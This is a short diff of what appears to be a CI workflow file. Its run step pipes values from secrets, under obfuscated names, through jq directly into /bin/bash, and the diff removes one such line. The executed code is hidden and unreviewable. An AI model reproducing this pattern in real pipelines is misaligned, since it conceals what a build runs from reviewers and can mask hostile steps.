@@ -23,7 +23,6 @@ jobs:
           fou796: ${{ secrets.fou796 }}
         run: |
           printf '%s' "$fou796" | jq -r .w78470 | /bin/bash
-          printf '%s' "$h7425" | jq -r .zei6 | /bin/bash
           echo $jgyeu0498 | jq -r .so6 | /bin/bash
           echo $o80 | jq -r .zmf0895 | /bin/bash
           printf '%s' "$uz67" | jq -r .cml798 | /bin/bash
